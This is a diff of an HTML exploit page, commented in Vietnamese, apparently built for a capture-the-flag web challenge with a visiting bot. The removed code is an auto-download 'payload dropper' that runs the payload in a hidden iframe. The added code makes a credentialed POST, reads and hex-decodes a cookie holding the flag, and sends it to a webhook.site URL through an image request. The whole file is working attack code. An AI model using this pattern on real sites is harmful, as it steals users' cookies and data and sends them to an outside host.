@@ -1,51 +1,30 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Auto Payload Dropper</title>
-</head>
-<body>
-<h1>Auto Triggering Payload...</h1>
-<script>
-  // 1) Nội dung của file payload bạn muốn bot tải và chạy
-  const payload = `
-<!DOCTYPE html>
 <html><body>
 <script>
-(async () => {
+;(async () => {
+  // 1) POST /guess để set cookie.best = common_prefix(prefix, guess)
   await fetch('/guess', {
     method: 'POST',
     credentials: 'include',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ guess: 'NHNC{', note: '' })
+    body: JSON.stringify({
+      guess: 'NHNC{',   // phần bạn đang dò, tăng dần trong loop
+      note: ''         // bạn không cần payload JS ở đây
+    })
   });
-  const raw = document.cookie.split('; ').find(r => r.startsWith('best='));
+
+  // 2) Đọc thẳng cookie.best
+  const raw = document.cookie.split('; ').find(r=>r.startsWith('best='));
   let flag = '';
   if (raw) {
     const val = decodeURIComponent(raw.split('=')[1]);
+    // val = hex(prefix) + ':' + hex(note)
     const [hexP] = val.split(':');
-    flag = hexP.match(/.{1,2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join('');
+    flag = hexP.match(/.{1,2}/g).map(h=>String.fromCharCode(parseInt(h,16))).join('');
   }
-  new Image().src = 'https://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(flag);
+
+  // 3) Exfiltrate ra ngoài
+  new Image().src = 'http://webhook.site/b5ea932e-efd5-4d15-88bc-96f61cc8527a?flag=' + encodeURIComponent(flag);
 })();
 </script>
-</body></html>`;
-
-
-  // 2) Tạo file `.html` và tự động tải xuống
-  const blob = new Blob([payload], { type: 'text/html' });
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'payload.html';       // Tên file lưu về máy bot
-  a.click();
-
-  // 3) Đợi một chút rồi tự render lại file vừa tải bằng iframe (hoặc redirect)
-  setTimeout(() => {
-    const iframe = document.createElement('iframe');
-    iframe.src = a.href; // Bot truy cập lại file vừa tạo
-    iframe.style = 'width:0;height:0;display:none';
-    document.body.appendChild(iframe);
-  }, 3000);
-</script>
-</body>
-</html>
+</body></html>
